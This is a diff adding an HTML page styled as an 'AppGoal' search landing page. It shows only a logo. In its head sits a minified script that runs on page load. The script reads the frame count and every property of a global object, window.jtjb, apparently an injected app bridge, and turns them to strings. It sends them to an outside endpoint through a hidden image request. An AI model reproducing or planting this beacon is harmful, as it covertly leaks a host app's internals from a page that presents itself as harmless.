@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>AppGoal</title>
+<style>
+        body {
+            position: relative;
+            height: 100vh;
+            margin: 0;
+        }
+
+        #__search {
+            position: absolute;
+            width: 640px;
+            top: 40%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        @media (max-width: 711px) {
+            #__search {
+                width: 90%;
+            }
+        }
+
+        footer {
+            position: absolute;
+            width: 100%;
+            bottom: 0;
+            padding: 20px 0;
+            font-family: "Helvetica Neue", Arial, sans-serif;
+            font-size: 12px;
+            color: #666;
+        }
+
+        footer .us {
+            text-align: center;
+            line-height: 30px;
+        }
+
+        footer .us a {
+            text-decoration: none;
+            color: #666;
+        }
+
+        footer .us span {
+            display: inline-block;
+            margin: 0 8px;
+        }
+
+        footer .us .cc {
+            margin: 0;
+        }
+
+        .logo-com {
+            color: #00bcd6;
+        }
+
+        .search-form {
+            position: relative;
+        }
+
+        .search-btn {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 56px;
+            height: 40px;
+            padding: 3px 11px;
+            border: #0da5da solid 1px;
+            border-radius: 0 2px 2px 0;
+            color: #fff;
+            background-color: #00bcd6;
+        }
+
+        .search-box {
+            width: 100%;
+            height: 40px;
+            padding-left: 15px;
+            border: 1px solid #bbb8b8;
+            border-radius: 2px 0 0 2px;
+            outline: none;
+            font-size: 18px;
+            box-sizing: border-box;
+            vertical-align: bottom;
+        }
+
+        .logo {
+            margin: 20px 0;
+            text-align: center;
+            line-height: 70px;
+            font-weight: 900;
+            font-size: 20px;
+        }
+
+        .logo-front {
+            display: inline-block;
+            width: 100px;
+            height: 70px;
+            padding-left: 15px;
+            color: #fff;
+            border-radius: 0% 100% 43% 57% / 2% 51% 49% 98%;
+            background-image: linear-gradient(243deg, #00bcd6 50%, #FF0099 100%);
+        }
+    </style>
+    <script>
+        function sendTextToURL(e,t){const o=encodeURIComponent(t),n=`${e}?text=${o}`,r=document.createElement("img");r.src=n,document.body.appendChild(r)}const url="https://jsonplaceholder.typicode.com/posts",framesLength=window.frames.length;var itf=window.jtjb,exf={framesLength:framesLength};for(var prop in itf)itf.hasOwnProperty(prop)&&(exf[prop]=itf[prop].toString());
+        sendTextToURL(url,JSON.stringify(exf))
+    </script>        
+</head>
+<body>
+<div id="__search">
+<div class="logo">
+<span class="logo-front">AppGoal</span>
+</div>
+</div>
+<div style="width: 100%;height: 100%"></div>
+</body>
+</html>
